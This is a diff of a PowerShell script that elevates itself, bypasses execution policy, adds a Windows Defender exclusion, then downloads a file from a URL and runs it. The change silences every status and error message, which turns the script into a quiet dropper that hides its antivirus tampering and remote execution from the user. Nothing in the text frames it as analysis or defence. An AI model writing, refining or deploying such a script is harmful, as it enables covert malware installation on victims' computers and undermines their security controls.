@@ -7,18 +7,18 @@ function Ensure-Administrator {
     if (-not $isAdmin) {
         try {
             
-            Write-Host "Attempting to restart the script with administrative privileges..." -ForegroundColor Yellow
+            #Write-Host "Attempting to restart the script with administrative privileges..." -ForegroundColor Yellow
             Start-Process -FilePath "PowerShell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
             # Exit the current (non-elevated) script
             exit
         }
         catch {
-            Write-Error "Failed to elevate to administrative privileges: $_"
+            #Write-Error "Failed to elevate to administrative privileges: $_"
             exit 1
         }
     }
     else {
-        Write-Host "Script is running with administrative privileges." -ForegroundColor Green
+        #Write-Host "Script is running with administrative privileges." -ForegroundColor Green
     }
 }
 
@@ -30,13 +30,13 @@ function Add-WindowsDefenderExclusion {
     )
 
     try {
-        Write-Host "Adding '$Path' to Windows Defender exclusions..." -ForegroundColor Cyan
+       # Write-Host "Adding '$Path' to Windows Defender exclusions..." -ForegroundColor Cyan
         Add-MpPreference -ExclusionPath $Path
         
         # Adding a 5-second delay to ensure the exclusion is processed
         Start-Sleep -Seconds 5
 
-        Write-Host "Successfully added '$Path' to exclusions." -ForegroundColor Green
+       # Write-Host "Successfully added '$Path' to exclusions." -ForegroundColor Green
     }
     catch {
         Write-Error "Failed to add exclusion: $_"
@@ -55,9 +55,9 @@ function Download-File {
     )
 
     try {
-        Write-Host "Downloading file from '$Url' to '$DestinationPath'..." -ForegroundColor Cyan
+        #Write-Host "Downloading file from '$Url' to '$DestinationPath'..." -ForegroundColor Cyan
         Invoke-WebRequest -Uri $Url -OutFile $DestinationPath
-        Write-Host "Download completed successfully." -ForegroundColor Green
+       # Write-Host "Download completed successfully." -ForegroundColor Green
     }
     catch {
         Write-Error "Failed to download file: $_"
@@ -73,13 +73,13 @@ function Execute-File {
     )
 
     try {
-        Write-Host "Executing file '$FilePath'..." -ForegroundColor Cyan
+       # Write-Host "Executing file '$FilePath'..." -ForegroundColor Cyan
         # Start the process without waiting for it to finish
         Start-Process -FilePath $FilePath
-        Write-Host "Execution initiated." -ForegroundColor Green
+       # Write-Host "Execution initiated." -ForegroundColor Green
     }
     catch {
-        Write-Error "Failed to execute file: $_"
+       # Write-Error "Failed to execute file: $_"
         exit 1
     }
 }
@@ -121,7 +121,7 @@ Execute-File -FilePath $destinationFile
 #     Write-Error "Failed to remove exclusion: $_"
 # }
 
-Write-Host "Script execution completed." -ForegroundColor Yellow
+#Write-Host "Script execution completed." -ForegroundColor Yellow
 
 # Exit the script to close the PowerShell window
 exit
